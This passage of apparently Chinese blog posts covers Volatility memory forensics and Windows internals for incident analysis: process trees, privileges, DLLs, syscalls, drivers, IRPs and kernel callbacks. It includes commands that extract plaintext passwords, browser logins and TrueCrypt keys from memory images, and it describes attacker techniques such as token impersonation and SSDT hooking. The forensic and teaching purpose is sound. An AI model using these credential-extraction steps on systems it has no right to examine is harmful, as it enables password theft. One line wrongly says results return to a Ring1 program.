以hex转储的形式输出，可能藏有东西\nDefaultPassword：系统为自动登录功能存储的密码，如果设置了就是对应用户的密码\nNL$KM：计算机的密钥，用于计算机和域控制器之间进行安全的通信和认证\nDPAPI_SYSTEM：系统级DPAPI的主密钥，用于解密用户保存的各种密码（浏览器里的、wifi密码等）\n提取明文密码（mimikatz） 实际上也是从lsass.exe里面提取，是lsadump的特化\n非官方插件，需要下载：\nhttps://raw.githubusercontent.com/volatilityfoundation/community/master/FrancescoPicasso 还需要安装依赖，必须是对应旧版本的construct库：\nsource /home/kali/volatility2/venv_volatility2/bin/activate pip2 install construct==2.5.2 deactivate 随后就可以使用了：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; mimikatz 查看Chrome记录的登录密码（lastpass） 需要下载插件lastpass：\nhttps://github.com/ruokeqx/tool-for-CTF/tree/master/volatility_plugins vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; lastpass 获取TrueCrypt秘钥信息（truecryptmaster） vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; truecryptmaster 获取TrueCrypt密码信息 （truecryptpassphrase） vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; truecryptpassphrase 文件扫描与提取 扫描内存中的文件（filescan） Volatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; filescan 如果知道具体文件名称（-i忽略大小写）：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; filescan | grep -i \u0026#39;secret.txt\u0026#39; 如果想找指定文件类型（-E正则匹配）：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; filescan | grep -E \u0026#39;jpg|png|jpeg|bmp|gif\u0026#39; 最前面的十六进制是文件地址\nVolatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.filescan.FileScan 从内存中转储指定文件（dumpfiles） filescan插件扫描的是_FILE_OBJECT这样的内核结构，相当于找到了文件的档案卡\ndumpfiles插件则是根据这张档案卡的指引，去内存中寻找文件的具体内容\n如果文件的内容当时没有被加载到内存（RAM）中，或者已经被操作系统置换到了页面文件（pagefile.sys）里，那么dumpfiles就无法从内存镜像中提取出完整的文件数据\nVolatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;配置文件\u0026gt; dumpfiles -Q \u0026lt;物理地址\u0026gt; -D \u0026lt;目录\u0026gt; 下载的文件是.data文件，改后缀或使用foremost等工具分析\nVolatility3 vol3 -f \u0026lt;内存镜像\u0026gt; -o \u0026lt;目录\u0026gt; windows.dumpfiles.DumpFiles --physaddr \u0026lt;物理地址\u0026gt; 从内存中搜索字符串 (strings) Volatility3有windows.strings.Strings插件，不过不太好用，我们主要目的还是搜索字符串\n常见的用法是先用memdump转储出某个可疑进程的内存文件，然后对这个小文件执行strings，这样目标更明确，噪音也更少：\nstrings 1234.dmp | grep -i \u0026#34;关键词\u0026#34; ","date":"2025-07-21T12:51:01+08:00","image":"http://picture.928330.xyz/typora/11656e3e84668fccb365afc0b917f85b.jpg","permalink":"https://blog.928330.xyz/p/volatility%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/","title":"volatility使用说明"},{"content":"上篇看这里 -\u0026gt; windows相关知识总结（上） 进程 常见进程 初始化进程 System 进程ID通常为4，是内核级线程的宿主，是运行ntoskrnl.exe的容器\n（ntoskrnl.exe负责内存管理、进程/线程调度、硬件抽象、系统调用处理等功能）\n它是进程树的根，没有父进程，如果看到有用户模式的进程成为它的子进程，需要高度警惕\nsmss.exe 会话管理器子系统，负责创建新的用户会话，是系统中的第一个真实进程\n它会启动csrss.exe和winlogon.exe\ncsrss.exe 客户端/服务器运行时子系统，负责管理窗口、线程和控制台等，每个会话中都会有一个实例\n其父进程必须是smss.exe\nwininit.exe Windows初始化进程，在系统引导时启动，会一直保留在后台运行\n它的核心任务是启动三个关键进程：services.exe、lsass.exe和lsm.exe，任何其他进程都值得审查\n其父进程应为空\nwinlogon.exe Windows 登录管理器，负责处理用户的交互式登录与注销过程，并加载用户配置文件\n在用户成功登录后，它会负责启动userinit.exe\n其父进程必须是smss.exe\nuserinit.exe 用户初始化进程，负责在用户登录后执行登录脚本、恢复网络连接，并启动用户外壳程序（Shell）\n它在启动了用户的桌面环境（默认为 explorer.exe）后会立刻退出，因此在正常的进程列表中几乎看不到它\n其父进程必须是winlogon.exe\nexplorer.exe Windows资源管理器，也是用户登录后启动的第一个进程，是所有用户图形化操作的起点\n在一个标准的 Windows 会话中，它有四个功能：\n文件管理器：打开“我的电脑”时看到的那些文件和文件夹窗口 任务栏与开始菜单：屏幕底部的任务栏、开始按钮、系统托盘区 桌面图标管理器：桌面图标，以及对它们的点击、拖拽等交互 桌面背景绘制：桌面壁纸等 恶意软件经常向其注入DLL，以获取用户权限并保持持久化\n核心服务进程 services.exe 服务控制管理器，负责启动和管理所有系统服务，是所有通过正常方式启动的svchost.exe的父进程\n其父进程必须是wininit.exe\nlsass.exe 本地安全机构子系统服务，内存中存放着用户的密码哈希等敏感凭证，系统中必须有且只有一个实例\n其父进程必须是wininit.exe\nlsm.exe 本地会话管理器服务，处理与用户登录、注销、远程桌面连接和快速用户切换相关的终端服务\n其父进程必须是wininit.exe\nsvchost.exe 服务宿主进程，是 Windows 系统中的一个核心进程，专门用作运行各种系统服务的“容器”或“宿主”\n它也是最常见的伪装和注入目标：\n父进程：必须是services.exe\n文件路径：必须位于C:\\Windows\\System32\\\n网络连接：它承载的系统服务中，哪些建立了网络连接，连接到哪里\n脚本执行进程 rundll32.exe 用于执行DLL文件中的函数，攻击者常用它来加载恶意DLL，从而绕过基于程序名的检测\n分析时应关注其父进程是谁，以及它加载了哪个DLL\npowershell.exe 是命令行和脚本引擎，现代无文件攻击的首选工具\n任何powershell.exe的出现都值得审查，特别是其命令行参数中是否包含编码（-e）、混淆或下载链接\nconhost.exe 控制台窗口主机，为cmd.exe等命令行程序提供交互界面\n它的内存中存储了该命令行窗口中所有输入过的命令和输出过的结果\n进程权限 系统级核心特权 SeTcbPrivilege **这是Windows中权限最高、最强大的特权之一。**全称是作为操作系统的一部分(Act as part of the operating system)，通常被称为可信计算基（Trusted Computer Base, TCB）特权\n拥有此特权的进程被视为系统核心信任的一部分，可以执行几乎任何操作，包括创建安全令牌来冒充任何用户，除了极少数核心系统进程，任何程序都不应拥有它\nSeDebugPrivilege **调试程序特权。**它授予一个进程附加到其他任意进程并检查、修改其内存的能力\n攻击者常利用它来从lsass.exe中窃取密码，除了调试器和核心安全软件，任何普通程序（如记事本、浏览器）拥有它都极度可疑\nSeLoadDriverPrivilege **加载和卸载设备驱动程序特权。**它授予一个进程将内核模式驱动程序（.sys文件）加载到Windows内核中或从内核中卸载的能力\n这是通往内核模式的入口，恶意软件一旦获得此特权，就可以加载自己的恶意驱动，从而隐藏文件、进程、网络连接，并完全绕过用户态的安全软件\n安全与审计特权 SeTakeOwnershipPrivilege **获取对象所有权特权。**它授予进程获取系统上任何安全对象（如文件、文件夹、注册表项）的所有权的能力，即使该进程原本没有访问该对象的权限\n攻击者获得它之后，就可以强行霸占受系统保护的文件或注册表键，然后赋予自己读写权限，进而篡改系统配置或替换核心文件\nSeBackupPrivilege **备份文件和目录特权，可以做到读取一切。**它允许进程在读取文件时，绕过所有常规的文件和目录权限检查（ACL），其初衷是让备份软件可以备份系统上的所有文件\n数据窃取类木马和勒索软件经常利用此特权来读取它们本无权访问的敏感用户文档、数据库文件或配置文件，以便进行窃取或加密\nSeRestorePrivilege **还原文件和目录特权，可以做到写入一切。**与SeBackupPrivilege对应，它允许进程在写入文件时，绕过所有权限检查\n恶意软件可以利用它来覆盖受保护的系统文件、在系统目录中释放恶意程序，或修改锁定的配置文件以实现持久化\nSeSecurityPrivilege **管理审核和安全日志特权，可以做到删除痕迹。**主要允许进程查看和清空 Windows 安全事件日志\n攻击者在完成入侵后，会利用这个特权来清空安全日志，从而抹去自己的登录尝试、账户创建、权限使用等痕迹\n常规特权 SeShutdownPrivilege **关闭系统特权。**授予进程关闭本地计算机的权力\nSeImpersonatePrivilege **身份验证后模拟客户端特权。**通常授予服务类账户，允许一个服务进程模拟连接到它的客户端的安全上下文\n攻击者可以诱使一个高权限进程（如SYSTEM）来连接自己，然后利用此特权“模拟”这个高权限进程，从而将自己从一个低权限的服务账户提升到SYSTEM权限\nSeChangeNotifyPrivilege **绕过遍历检查特权。**它允许进程在访问一个对象时，无需检查路径中所有上级目录的权限\n这是一个正常无害的特权，Windows 默认会将其授予所有用户，包括最低权限的用户\nDLL 什么是DLL DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型\n在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中，当我们执行某一个程序时，相应的DLL文件就会被调用\n一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件\nDLL文件中存放的是各类程序的函数(子过程)实现过程，当程序需要调用函数时需要先载入DLL，然后取得函数的地址，最后进行调用\n使用DLL文件的好处是程序不需要在运行之初加载所有代码，只有在程序需要某个函数的时候才从DLL中取出\nDLL的调用方式 1. 静态调用 / 隐式链接 在运行程序前，必须先把所有的DLL都准备好，少一个都不行\n在编译程序的时候，开发者就已经在代码中明确声明了需要用到哪些DLL里的哪些函数 这些依赖关系被记录在最终生成的可执行文件（.exe）的头部，一个叫做“导入表“（Import Table）的地方 当运行这个.exe文件时，Windows加载器会首先读取这个表 加载器会根据导入表的信息，在硬盘上找到所有必需的DLL文件，并将它们加载到该进程的内存空间中 所有函数地址都链接好之后，程序的主代码才开始执行 2. 动态调用 / 显式链接 在运行程序前，不需要把所有的DLL都准备好，少了哪个就引入哪个\n程序在编译时，并不知道自己会用到哪些DLL 程序在运行过程中，根据当时的逻辑判断，临时决定需要某个DLL的功能 程序会调用特定的WindowsAPI函数来手动加载这个DLL LoadLibrary()：这个函数用来将指定的DLL文件加载到内存中 GetProcAddress()：加载成功后，用这个函数从DLL中获取特定函数的地址 拿到函数地址后，程序就可以像调用自己的函数一样调用它了 当不再需要时，可以调用FreeLibrary()将其从内存中卸载 常见DLL 核心系统库 (几乎所有进程都会加载) ntdll.dll WindowsNT核心库，是用户态程序与系统内核之间最底层的接口，封装了大量的系统调用，例如进程和线程的创建、内存管理、文件I/O以及与内核对象的交互\n其他更高层的核心库（如kernel32.dll）最终也需要调用ntdll.dll中的函数来完成实际的工作\nkernel32.dll / kernelbase.dll kernel32.dll是Windows中最核心的用户模式库之一，为应用程序提供了访问操作系统的基础功能，如内存管理、文件I/O和进程线程管理\n从Windows7开始，许多kernel32.dll的核心功能被重构并移入了kernelbase.dll，而kernel32.dll本身则更多地作为调用这些新功能的一个“转发层”\nuser32.dll 负责所有用户图形界面（GUI）的功能设计，如窗口、菜单、按钮、鼠标和键盘输入等，即结构和交互\n在早期32-bit 版本的Windows中，用户控件是在ComCtl32中实现的，但是一些控件的显示功能是在User32.dll中实现的，例如在一个窗口中非客户区域（边框和菜单）的绘制就是由User32.dll来完成的\nUser32.dll是操作系统的一个核心控件，它和操作系统是紧密联系在一起的，不同版本的Windows中User32.dll是不同，因此，应用程序在不同版本的Windows中运行的时候，由于User32.dll的不同，会导致应用程序的界面通常会有微小的不同\ngdi32.dll 负责图形化窗口的图形绘制与内容输出，包括像素、线条、字体、位图、画刷等，即内容和外观\ncomdlg32.dll 通用对话框库（Common Dialog Box Library），这个库为应用程序提供了标准的、预制好的对话框，比如常见的“打开文件”、“保存文件”和“打印”等窗口\n当user32.dll需要一个“打开文件”对话框时，它不去自己一点点造，而是直接从comdlg32.dll这里拿一个现成的、标准化的来用\nadvapi32.dll 高级Windows32位应用程序接口，负责处理注册表操作、系统服务管理、账户和安全相关的函数\n网络通信库 (判断网络行为的关键) ws2_32.dll / wsock32.dll Windows Sockets（套接字）库，是所有 TCP/IP 网络编程的基础\n这是一个最重要的网络行为指标\nwininet.dll 更高层的互联网协议库，封装了 HTTP、HTTPS 和 FTP 等协议，让程序能更方便地访问网页和传输文件。\ndnsapi.dll 负责进行 DNS 域名解析，即将网址（如 www.google.com）转换为 IP 地址\n脚本与执行相关库 shell32.dll 提供了核心的 Windows Shell（外壳）功能，如打开文件、显示属性、处理快捷方式等\nole32.dll / oleaut32.dll 负责处理 OLE（对象链接与嵌入）和 COM（组件对象模型）技术\nOffice 宏病毒和许多漏洞利用（如利用文档中嵌入的恶意对象）都严重依赖这两个库的功能\njscript.dll / vbscript.dll 分别用于解析和执行 JScript 和 VBScript 脚本的引擎\n当wscript.exe或mshta.exe等脚本执行进程加载它们时，表明有相应的脚本正在运行\n系统调用 什么是系统调用 系统调用是运行在用户模式 (UserMode/Ring3) 的应用程序，向操作系统内核 (KernelMode / Ring0) 请求服务或资源的唯一、规范化的接口\n这是操作系统为了保护自身稳定性和安全性而设定的核心机制，应用程序不能随心所欲地直接访问硬件或关键内存，所有这些敏感操作都必须通过系统调用，以一种受控的方式“委托”给内核来完成\n系统调用工作过程 准备阶段 用户模式的应用程序（例如notepad.exe）准备调用一个Win32API函数，比如 WriteFile，WriteFile 函数本身位于kernel32.dll中\n中介阶段 kernel32.dll中的WriteFile函数并不会直接执行写文件操作，它是一个包装函数\n它会把真正的写文件操作对应的系统调用编号（比如写文件的NtWriteFile 的编号）放入CPU的EAX寄存器中，并将其他参数（如文件句柄、数据缓冲区等）放入其他指定的寄存器\n切换阶段 准备好之后，ntdll.dll中的代码会执行一条特殊的CPU指令，例如SYSCALL\n特权级转换 SYSCALL指令会使CPU立即从用户模式切换到内核模式，并将控制权交给内核中一个预设好的系统调用总处理程序\n派阶段 内核的总处理程序接管控制权后，会查看EAX寄存器中的系统调用编号，然后利用这个编号去SSDT中查找对应的内核函数地址\n执行阶段 找到地址后，内核会跳转到该地址（例如内核中的NtWriteFile函数）去执行真正的文件写入操作\n返回阶段 内核函数执行完毕后，会将结果返回，CPU 再从内核模式切换回用户模式，应用程序继续执行\nSSDT SSDT 的全称是System Service Dispatch Table（系统服务分派表）\n它就是我们在上面流程中提到的那个函数地址查询表，它是一个存放在内核内存中的数组，数组的每一个元素都是一个函数指针，指向了实现具体系统调用的内核函数的内存地址\n当系统调用发生时，内核就是通过系统调用编号作为索引，在这个 SSDT 数组中找到并调用正确的内核函数\nSSDThook 由于 SSDT 是所有关键操作的必经之路，它成为了内核级 Rootkit 的首要攻击目标\nRootkit（通常是一个恶意的.sys驱动）会获取到 SSDT 在内存中的地址，然后用自己的恶意函数地址，去覆盖表中某个正常系统函数的地址\n比如一个文件隐藏Rootkit，可能会用自己的HookedNtQueryDirectoryFile函数地址，替换掉SSDT中原始的 NtQueryDirectoryFile（用于列出目录内容）的地址\n此后，当任何程序（包括 explorer.exe）尝试列出目录内容时，系统调用都会被重定向到这个恶意的 HookedNtQueryDirectoryFile函数这个恶意函数会先获取原始的目录列表，然后将其中所有与Rootkit自身相关的恶意文件名都过滤掉，最后再将一个“干净”的列表返回给应用程序，这样，用户就永远无法看到这些恶意文件了\n如果一个函数的地址指向的不是官方的 ntoskrnl.exe (或 win32k.sys)，而是指向了一个第三方的、可疑的驱动文件，那么就意味着SSDT已被劫持\n系统调用的分类 进程与线程管理 NtCreateProcess 创建一个新进程\nNtTerminateProcess 终止一个进程\nNtCreateThread 创建一个新线程\nNtOpenProcess 打开一个已存在进程的句柄\n文件与 I/O 操作 NtCreateFile 创建或打开一个文件\nNtReadFile 从文件中读取数据\nNtWriteFile 向文件中写入数据\nNtDeviceIoControlFile 向设备驱动发送控制命令\n注册表操作 NtOpenKey 打开一个注册表项\nNtQueryValueKey 查询一个注册表键值的数据\nNtSetValueKey 设置一个注册表键值的数据\n内存管理 NtAllocateVirtualMemory 在进程的虚拟地址空间中分配内存\nNtProtectVirtualMemory 修改内存页的保护属性（如可读、可写、可执行）\n驱动 什么是驱动 驱动程序（Driver）是一个软件组件，它充当了操作系统内核与物理硬件或虚拟设备之间的通信桥梁\n当应用程序需要与硬件（如打印机、网卡、磁盘）交互时，它会向操作系统发出一个通用请求\n操作系统内核的I/O管理器接收到这个请求后，不会直接与硬件对话，而是将请求打包成IRP请求转发给相应的驱动程序\n驱动程序负责将这个标准化的请求翻译成硬件能够理解的特定指令，并与硬件通信\nCPU的特权级别 在了解驱动文件之前，我们得先知道x86架构CPU的四个特权级别\n特权级别在x86架构中也被称为保护环（Protection Rings），是CPU硬件层面实现的一种访问控制机制\nx86架构定义了四个特权级别，从Ring0到Ring3，数字越小，代表权限越高\nRing 0: 内核态（Kernel Mode） 权限：最高。运行在Ring0的代码可以执行 CPU 的所有指令集，并能直接访问任何内存地址、I/O端口和硬件设备\n运行实体: 操作系统内核本身。例如ntoskrnl.exe和绝大多数设备驱动程序(.sys 文件)\n这是操作系统的核心，负责管理系统所有资源，包括进程调度、内存管理、I/O 控制等\n如果Ring0的代码崩溃，整个系统将立即蓝屏（BSOD）或宕机（Kernel Panic）\nRing 1 \u0026amp; Ring 2: 准核心态/驱动层（Rarely Used） 权限：介于内核态和用户态之间。它们拥有比Ring3更高的权限（例如可以访问更多的 I/O 端口），但又不像Ring0那样拥有对系统的完全控制权\n运行实体: 在理论设计上，Ring1可以用于运行一些准系统级的服务，而Ring2可以用于运行设备驱动程序，从而将驱动与最核心的内核隔离开，增加系统的稳定性（即驱动崩溃不至于让整个内核崩溃）\n它几乎从未被主流消费级和服务器级操作系统（如 Windows, Linux, macOS）所使用\n这些操作系统普遍采用了更简单的两级模型，即只使用Ring0和Ring3\n这是因为在Ring1/2和Ring0之间切换上下文的开销，以及复杂的内存管理，并没有带来足够的安全收益来抵消其复杂性\nRing 3: 用户态（User Mode） 权限：最低。运行在Ring3的代码受到硬件的严格限制，它不能直接访问硬件，也不能访问属于内核或其他进程的受保护内存空间\n运行实体：所有的应用程序。例如浏览器 、记事本、游戏等，都运行在Ring3\n这是应用程序的沙箱，当一个Ring3的程序需要执行特权操作时（如读取文件），它不能直接去操作硬盘，而是必须通过一个名为系统调用的受控入口，向Ring0的内核提出请求\n内核会对请求进行验证，然后以Ring0的权限代为执行，再将结果返回给Ring1的程序\n这个过程确保了所有对关键资源的访问都在内核的掌控之下\n驱动的文件形式 .sys文件 这是最传统、最核心、权限最高的驱动程序形式，是真正的驱动\n它们是专门为在操作系统内核（Ring0）中运行而编译的，可以直接与硬件和内核数据结构交互\n几乎所有核心的硬件驱动，如磁盘驱动ntfs.sys、网络驱动tcpip.sys等，都是.sys文件\n.dll文件 它们有的情况下是驱动组件，但大多数不是传统驱动\n为了提高系统的稳定性和安全性，微软引入了用户模式驱动框架 (User-Mode Driver Framework, UMDF)\n一些对性能要求不是极致、但对稳定性要求很高的设备（如扫描仪、打印机、传感器等）的驱动，可以被实现为DLL文件\n这些驱动DLL运行在权限受限的用户模式（Ring3），并由一个系统进程（通常是svchost.exe）作为“宿主”来加载和运行\n驱动程序的分类 按运行模式分类 内核模式驱动程序 这是最常见的类型，运行在操作系统的核心层 (Ring 0)，拥有最高权限\n它们可以直接与硬件通信，是系统运行的基石\n用户模式驱动程序 运行在权限受限的用户模式 (Ring3) 下，安全性更高\n如果这类驱动程序崩溃，不会导致整个系统蓝屏\n按功能层次分类 总线驱动程序 位于驱动栈的最底层，负责枚举挂载在总线（如 PCI, USB）上的所有设备\n功能驱动程序 驱动栈的核心，通常由硬件厂商编写，负责实现设备的具体I/O功能\n筛选驱动程序 可以附加在功能驱动程序之上或之下，用于“过滤”或“修改”流经该设备的 I/O 请求\n杀毒软件的文件实时监控、磁盘加密软件等，通常就是通过它来实现的\n常见的核心系统驱动 内核核心模块 不是传统驱动，但居于内核中心\nntoskrnl.exe 它是操作系统内核本身，是所有内核活动的核心\n可以把它理解为驱动管理器和最根本的驱动，虽然它实际上并非严格意义上的设备驱动\n在系统启动时，ntoskrnl.exe会加载一系列其它核心模块（DLL 和 SYS）：\nhal.dll：硬件抽象层（HAL） kdcom.dll：内核调试通信 bootvid.dll、ci.dll：安全校验、驱动签名 各类驱动程序：acpi.sys、tcpip.sys、disk.sys等 它是整个内核态模块的中枢，所有其他的驱动程序都需要在它提供的框架内运行，并由它来管理和调度\n内核支持模块 DLL类内核组件，没有设备对象，也不处理IRP，不是传统驱动，但运行在内核态，是 OS 的底层模块\nhal.dll 硬件抽象层，屏蔽不同主板和 CPU 的差异，为内核提供统一接口\nkdcom.dll 内核调试通信模块，用于系统调试时与调试器通信\nci.dll 负责代码完整性校验与驱动签名验证\nbootvid.dll 开机阶段的简易显示输出，属于引导组件\n内核设备驱动程序 是真正严格意义上的驱动\ntcpip.sys 负责TCP/IP协议栈的核心驱动，处理所有网络数据包的收发。属于网络类驱动的代表\nntfs.sys NTFS 文件系统的核心驱动，负责硬盘上所有文件的读写和管理\n它实现了文件系统层的功能，如读写文件、挂载卷等\nacpi.sys 负责高级配置与电源管理接口（ACPI），处理系统电源管理事件，如休眠、唤醒、电源按钮等\n它属于系统级别的 ACPI 驱动\npartmgr.sys 管理磁盘的分区结构\nstorport.sys 提供与存储控制器（如 SATA、SCSI 控制器）之间的通信通道\ndisk.sys 硬盘设备驱动，处理底层磁盘I/O请求\n它与partmgr.sys、storport.sys等共同构建块设备访问层\n输入与图形类驱动 kbdclass.sys/mouclass.sys 键盘和鼠标的类驱动程序，负责处理来自这些输入设备的通用请求\n它不直接与硬件通信，而是接收底层端口驱动（如i8042prt.sys）上传的输入数据\ndxgkrnl.sys DirectX图形内核驱动，是Windows显示驱动模型（WDDM）的核心，负责与GPU交互、调度图形任务\n驱动开发支持框架模块 Wdf01000.sys Windows驱动程序框架（WDF）的一部分，是KMDF驱动的运行时组件，为许多现代驱动提供了统一的驱动模型支持\nWdfLdr.sys WDF加载器，负责驱动初始化\nWinUsb.sys WDF提供的USB驱动支持\n驱动栈 什么是驱动栈 当用户在用户层发出一个文件读写请求时，比如ReadFile(\u0026quot;D:\\\\example.txt\u0026quot;)，这个请求并不是直接送到硬盘，而是要经过多个驱动程序处理，每个驱动做自己的那一部分\n这种结构就叫驱动栈\n驱动栈的结构 下面是一个典型的Windows 存储驱动栈：\nntfs.sys（文件系统驱动） ← 顶层（用户文件访问） ↑ volmgr.sys（卷管理器驱动） ↑ partmgr.sys（分区管理器驱动） ↑ disk.sys（磁盘驱动） ↑ storport.sys（存储端口驱动） ↑ Miniport Driver（存储控制器驱动） ← 底层（控制硬件） 驱动栈工作过程 应用程序发起 I/O 请求 用户程序调用ReadFile()或WriteFile()等API，也就是进行了涉及请求访问硬件或设备的系统调用 文件系统驱动处理 ntfs.sys解析文件路径、权限等，将文件操作转换为卷层面的块设备请求 卷管理器驱动处理 volmgr.sys管理逻辑卷，确定具体的物理磁盘分区 分区管理器驱动处理 partmgr.sys负责管理磁盘分区表，转发请求到正确的物理分区 磁盘驱动处理 disk.sys负责和物理磁盘设备交互，生成适合硬件的请求 存储端口驱动处理 storport.sys是与存储控制器通信的中间层，负责协议和请求队列管理 迷你端口驱动处理 由硬件厂商编写，具体实现与存储控制器硬件的交互 硬件执行请求 最终请求被硬件执行，数据被读写 这个过程中，每一层都可以处理请求、修改请求、拦截请求，层层检查\n其它类型的驱动栈 除了存储，还有很多其他的驱动栈：\nUSB 驱动栈（简化）： usbhub.sys（USB集线器驱动） ← 顶层（最高层） ↑ usbccgp.sys（通用USB类驱动） ↑ winusb.sys（用户模式USB驱动） ↑ usbport.sys（USB端口驱动） ↑ Miniport Driver（控制器驱动） ← 底层（最接近硬件） 网络驱动栈（NDIS）： tcpip.sys（TCP/IP 协议驱动） ← 顶层（协议层） ↑ ndis.sys（NDIS 中间层驱动） ↑ Miniport Driver（网卡驱动） ← 底层（硬件驱动） 显示设备驱动栈（Windows显示驱动模型WDDM） dxgkrnl.sys（DirectX 图形内核驱动） ← 顶层（图形API接口） ↑ display.sys（显示驱动核心） ↑ Miniport Driver（显卡硬件驱动） ← 底层（显卡硬件控制） 音频设备驱动栈 audiosrv（音频服务） ← 顶层（用户模式服务） ↑ sysaudio.sys（系统音频驱动） ↑ HDAudio.sys（高定义音频驱动） ↑ Miniport Driver（声卡厂商驱动） ← 底层（硬件控制） IRP IRP 是什么 IRP的全称是I/O Request Packet，即I/O 请求包，是内核中用于描述和传递所有I/O请求的核心数据结构\n当一个I/O请求产生时，I/O管理器会创建一个IRP对象，这个IRP就像一张填写好的快递单，上面包含了所有与本次请求相关的信息，如操作类型、数据缓冲区地址、目标设备等\n之后，I/O管理器会将这张快递单发送给目标设备对应的驱动程序栈，驱动程序通过处理这些 IRP 来完成工作\n恶意软件经常通过IRP挂钩的技术来劫持系统功能，它会找到一个正常驱动的IRP处理函数地址，并将其替换为指向自己恶意代码的地址。这样，所有发往正常驱动的IRP都会先被恶意软件截胡，从而实现键盘记录、文件隐藏等功能\nIRP在驱动栈中的传递 IRP创建 应用程序调用如ReadFile()，系统调用相关内核服务，内核根据请求生成一个IRP\nIRP包含请求类型、缓冲区地址、请求参数等信息\nIRP发送到驱动栈顶层驱动 例如，磁盘驱动栈中，顶层可能是文件系统驱动（ntfs.sys）\n内核将IRP传递给顶层驱动的Dispatch函数\n驱动处理IRP 驱动检查IRP内容，执行相应操作（如文件系统解析、数据缓存等）\n驱动可以完成请求，或者决定将IRP向下传递\nIRP向下传递给下一个驱动 驱动调用IoSkipCurrentIrpStackLocation，跳过当前驱动的IRP堆栈位置\n然后调用IoCallDriver把IRP传给下一个驱动，通常是更底层的驱动\n依次传递直到最底层驱动 IRP会层层传递，直到最底层的硬件驱动处理它\n底层驱动发起对硬件的实际操作，比如读写磁盘、发送网络包\nIRP完成 硬件操作完成后，底层驱动调用IoCompleteRequest标记 IRP 完成\nIRP 结果逐层向上传递回去，每层驱动可以执行清理或后处理，最终结果反馈给系统和应用程序\n应用程序请求 ↓ IRP创建 ↓ ntfs.sys（文件系统驱动） ← 顶层 ↓ 传递IRP volmgr.sys（卷管理器驱动） ↓ 传递IRP partmgr.sys（分区管理驱动） ↓ 传递IRP disk.sys（磁盘驱动） ↓ 传递IRP storport.sys（存储端口驱动） ↓ 传递IRP Miniport Driver（硬件控制驱动） ← 底层 ↓ 硬件操作 硬件设备完成请求 ↓ 结果返回 Miniport Driver ↓ 返回 storport.sys ↓ 返回 disk.sys ↓ 返回 partmgr.sys ↓ 返回 volmgr.sys ↓ 返回 ntfs.sys ↓ 返回 操作系统 常见IRP主要功能码 每个IRP都包含一个主要功能码，用于定义本次请求的核心操作类型\n文件与设备管理 IRP_MJ_CREATE 打开或创建文件、设备句柄\nIRP_MJ_CLOSE 关闭文件或设备句柄\nIRP_MJ_READ 从文件或设备读取数据\nIRP_MJ_WRITE 向文件或设备写入数据\nIRP_MJ_QUERY_INFORMATION 查询文件或设备信息（大小、属性等）\nIRP_MJ_SET_INFORMATION 设置文件或设备信息（修改属性等）\n设备控制 IRP_MJ_DEVICE_CONTROL 向驱动发送自定义控制命令（用户模式到驱动的常用命令）\nIRP_MJ_INTERNAL_DEVICE_CONTROL 驱动间内部控制命令，供驱动程序之间通信使用\n即插即用（PnP） IRP_MJ_PNP 即插即用事件通知，如设备启动、停止、移除、资源分配等\n电源管理 IRP_MJ_POWER 电源状态管理请求，如休眠、唤醒、电源状态改变等\n文件系统控制 IRP_MJ_FILE_SYSTEM_CONTROL 文件系统特定控制请求，如卷挂载、卸载等\n系统管理 IRP_MJ_SHUTDOWN 系统关机或重启时通知驱动准备关闭\nIRP_MJ_CREATE_MAILSLOT 创建邮件槽（用于进程间通信）\nIRP_MJ_QUERY_SECURITY 查询安全描述符\nIRP_MJ_SET_SECURITY 设置安全描述符\n其他常见功能码 IRP_MJ_QUERY_VOLUME_INFORMATION 查询卷信息\nIRP_MJ_SET_VOLUME_INFORMATION 设置卷信息\nIRP_MJ_CLEANUP 清理（关闭时，释放资源等）\n内核回调 什么是内核回调 内核回调（Kernel Callbacks） 是一种事件驱动的机制\n它允许内核模式的驱动程序向操作系统内核注册特定的系统级事件，当这些被注册的事件发生时，内核会暂停其正常操作流程，并逐一回调所有已注册的驱动程序提供的函数，即回调例程\n这是内核提供的一个事件通知系统，驱动程序不再需要通过不断轮询的方式来检查某个状态是否改变，而是可以被动地、在事件发生时才被内核精准地唤醒和调用\n示例（用户态）：\nvoid OnButtonClick() { printf(\u0026#34;按钮被点击！\\n\u0026#34;); } RegisterButtonCallback(OnButtonClick); // 注册回调 系统中，“按钮被点击”事件发生后，会自动调用注册的OnButtonClick()函数\n内核回调工作过程 注册 在驱动程序的初始化阶段（通常是在DriverEntry函数中），驱动程序会调用一个由内核导出的、特定于事件类型的注册函数。例如，要监控进程创建，驱动程序会调用PsSetCreateProcessNotifyRoutine\n在调用时，驱动程序会将一个指向自己内部实现的回调函数的地址，作为一个参数传递给内核\n内核接收到这个请求后，会将这个函数地址添加到一个与该事件类型相关联的、内部维护的回调函数指针链表中\n触发 当一个被订阅的系统事件发生时（例如NtCreateUserProcess系统调用被执行以创建一个新进程），内核在完成其核心操作的某个特定阶段，会暂停下来\n调用 内核会找到与该事件对应的回调函数指针链表，然后，它会依次遍历这个链表，并同步地调用每一个已注册的回调函数\n内核会将与事件相关的上下文信息（例如，对于进程创建事件，会传递新进程的PID、创建者信息等）作为参数传递给回调函数\n处理 驱动程序的回调函数被调用后，便可以在其函数体内执行自定义的逻辑\n它可以仅仅记录该事件，也可以进行干预，例如阻止该事件的完成（如果回调类型允许的话）\n常见内核回调 进程与线程相关回调 PsSetCreateProcessNotifyRoutine 功能：当进程创建或退出时触发 用途：监控进程行为（如杀毒软件、行为分析等） PsSetCreateThreadNotifyRoutine 